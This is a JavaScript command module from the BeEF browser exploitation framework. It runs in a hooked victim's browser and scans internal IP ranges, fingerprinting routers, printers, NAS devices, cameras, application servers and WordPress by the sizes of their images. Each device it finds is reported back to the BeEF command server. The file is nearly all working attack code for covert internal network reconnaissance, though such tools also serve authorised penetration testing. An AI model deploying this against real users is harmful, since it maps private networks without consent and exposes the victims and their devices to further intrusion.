//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
beef.execute(function() {

    var dom = document.createElement('b');
    var ips = new Array();
    ipRange = "<%= @ipRange %>";
    ports = "<%= @ports %>";
    if(ports != null){
      ports = ports.split(',');
    }

    if(ipRange != null){
        // ipRange will be in the form of 192.168.0.1-192.168.0.254: the fourth octet will be iterated.
        // (only C class IPs are supported atm)
        ipBounds = ipRange.split('-');
        lowerBound = ipBounds[0].split('.')[3];
        upperBound = ipBounds[1].split('.')[3];

        for(i=lowerBound;i<=upperBound;i++){
            ipToTest = ipBounds[0].split('.')[0]+"."+ipBounds[0].split('.')[1]+"."+ipBounds[0].split('.')[2]+"."+i;
            ips.push(ipToTest);
        }
    }else{
        //use default IPs
        ips = [
            '192.168.0.1',
            '192.168.0.100',
            '192.168.0.254',
            '192.168.1.1',
            '192.168.1.100',
            '192.168.1.254',
            '10.0.0.1',
            '10.1.1.1',
            '192.168.2.1',
            '192.168.2.254',
            '192.168.100.1',
            '192.168.100.254',
            '192.168.123.1',
            '192.168.123.254',
            '192.168.10.1',
            '192.168.10.254'
        ];
    }

    var urls = new Array(
    // in the form of: "Dev/App Name","Default Port","Use Multiple Ports if specified","IMG url","IMG width","IMG height"
	new Array("Apache",":80",false,"/icons/apache_pb.gif",259,32),
	new Array("Apache 2.x",":80",false,"/icons/apache_pb2.gif",259,32),
	new Array("Microsoft IIS 7.x",":80",false,"/welcome.png",571,411),
	new Array("Microsoft IIS",":80",false,"/pagerror.gif",36,48),
	new Array("QNAP NAS",":8080",false,"/ajax_obj/img/running.gif",16,16),
	new Array("QNAP NAS",":8080",false,"/ajax_obj/images/qnap_logo_w.gif",115,21),
	new Array("Belkin Router",":80",false,"/images/title_2.gif",321,28),
	new Array("Billion Router",":80",false,"/customized/logo.gif",318,69),
	new Array("Billion Router",":80",false,"/customized/logo.gif",224,55),
	new Array("SMC Networks",":80",false,"/images/logo.gif",133,59),
	new Array("Linksys NAS",":80",false,"/Admin_top.JPG",750,52),
	new Array("Linksys NAS",":80",false,"/logo.jpg",194,52),
	new Array("Linksys Network Camera",":80",false,"/welcome.jpg",146,250),
	new Array("Linksys Wireless-G Camera",":80",false,"/header.gif",750,97),
	new Array("Cisco IP Phone",":80",false,"/Images/Logo",120,66),
	new Array("Snom Phone",":80",false,"/img/snom_logo.png",168,62),
	new Array("Dell Laser Printer",":80",false,"/ews/images/delllogo.gif",100,100),
	new Array("Brother Printer",":80",false,"/pbio/brother.gif",144,52),
	new Array("HP LaserJet Printer",":80",false,"/hp/device/images/logo.gif",42,27),
	new Array("HP LaserJet Printer",":80",false,"/hp/device/images/hp_invent_logo.gif",160,52),
	new Array("JBoss Application server",":8080",true,"/images/logo.gif",226,105),
	new Array("Siemens Simatic",":80",false,"/Images/Siemens_Firmenmarke.gif",115,76),
	new Array("APC InfraStruXure Manager",":80",false,"/images/Xlogo_Layer-1.gif",342,327),
	new Array("Barracuda Spam/Virus Firewall",":8000",true,"/images/powered_by.gif",211,26),
	new Array("TwonkyMedia Server",":9000",false,"/images/TwonkyMediaServer_logo.jpg",150,82),
	new Array("Alt-N MDaemon World Client",":3000",false,"/LookOut/biglogo.gif",342,98),
	new Array("VLC Media Player",":8080",false,"/images/white_cross_small.png",9,9),
	new Array("VMware ESXi Server",":80",false,"/background.jpeg",1,1100),
	new Array("Microsoft Remote Web Workplace",":80",false,"/Remote/images/submit.gif",31,31),
	new Array("XAMPP",":80",false,"/xampp/img/xampp-logo-new.gif",200,59),
	new Array("Wordpress",":80",false,"/wp-includes/images/wpmini-blue.png",16,16)
	);

	// for each ip
	for(var i=0; i < ips.length; i++) {
		// for each url
		for(var u=0; u < urls.length; u++) {
            if(!urls[u][2] && ports != null){ // use default port
                var img = new Image;
                //console.log("Detecting  [" + urls[u][0] + "] at IP [" + ips[i] + "]");
                img.id = u;
                img.src = "http://"+ips[i]+urls[u][1]+urls[u][3];
                img.onload = function() { if (this.width == urls[this.id][4] && this.height == urls[this.id][5]) { beef.net.send('<%= @command_url %>', <%= @command_id %>,'discovered='+escape(urls[this.id][0])+"&url="+escape(this.src));dom.removeChild(this); } }
                dom.appendChild(img);
            }else{ // iterate to all the specified ports
                for(p=0;p<ports.length;p++){
                    var img = new Image;
                    //console.log("Detecting  [" + urls[u][0] + "] at IP [" + ips[i] + "], port [" + ports[p] + "]");
                    img.id = u;
                    img.src = "http://"+ips[i]+":"+ports[p]+urls[u][3];
                    img.onload = function() { if (this.width == urls[this.id][4] && this.height == urls[this.id][5]) { beef.net.send('<%= @command_url %>', <%= @command_id %>,'discovered='+escape(urls[this.id][0])+"&url="+escape(this.src));dom.removeChild(this); } }
                    dom.appendChild(img);
                }
            }
		}
	}
});

